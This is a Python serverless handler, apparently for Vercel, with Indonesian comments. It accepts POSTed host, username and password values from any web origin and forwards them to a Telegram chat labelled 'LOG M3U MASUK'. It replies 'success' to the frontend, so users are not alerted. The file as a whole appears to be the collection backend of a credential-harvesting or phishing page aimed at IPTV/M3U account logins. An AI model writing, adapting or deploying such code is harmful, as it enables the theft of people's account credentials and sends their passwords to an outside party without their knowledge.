import os
import json
import urllib.request
from http.server import BaseHTTPRequestHandler
from datetime import datetime

def kirim_ke_telegram(pesan):
    token = os.environ.get('TELEGRAM_BOT_TOKEN')
    chat_id = os.environ.get('TELEGRAM_CHAT_ID')
    
    if not token or not chat_id:
        print("ERROR: TELEGRAM_BOT_TOKEN atau TELEGRAM_CHAT_ID tidak ditemukan di Environment Variables Vercel")
        return

    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": pesan,
        "parse_mode": "Markdown"
    }
    
    try:
        req = urllib.request.Request(
            url,
            data=json.dumps(payload).encode('utf-8'),
            headers={'Content-Type': 'application/json'}
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            result = resp.read().decode('utf-8')
            print(f"Telegram OK: {result}")
    except Exception as e:
        print(f"Gagal kirim Telegram: {e}")

class handler(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        # Suppress default HTTP logs
        pass

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def do_POST(self):
        # ── 1. Baca body request langsung tanpa validasi key ───────────────
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
        except Exception as e:
            print(f"Error membaca body: {e}")
            post_data = ""

        # ── 2. Parse JSON dengan toleransi nama field frontend ───────────────
        pesan = ""
        if post_data:
            try:
                data = json.loads(post_data)
                
                # Toleransi pembacaan: mencoba 'host' (bawaan channel picker) baru 'server'
                server   = data.get('host') or data.get('server') or '-'
                username = data.get('username') or data.get('usr') or '-'
                password = data.get('password') or data.get('pwd') or '-'
                
                pesan = (
                    f"🚨 *LOG M3U MASUK* 🚨\n\n"
                    f"🌐 *Server* : {server}\n"
                    f"👤 *Username*: {username}\n"
                    f"🔑 *Password*: {password}\n\n"
                    f"⏰ *Waktu*: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} WIB"
                )
            except Exception:
                # Jika frontend mengirim data dalam bentuk teks biasa (bukan JSON)
                pesan = (
                    f"🚨 *LOG M3U MASUK (Raw Text)* 🚨\n\n"
                    f"`{post_data}`\n\n"
                    f"⏰ *Waktu*: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} WIB"
                )

        # ── 3. Kirim ke Telegram ────────────────────────────────────────
        if pesan:
            kirim_ke_telegram(pesan)

        # ── 4. Response sukses balik ke Frontend Web Anda ──────────────────
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
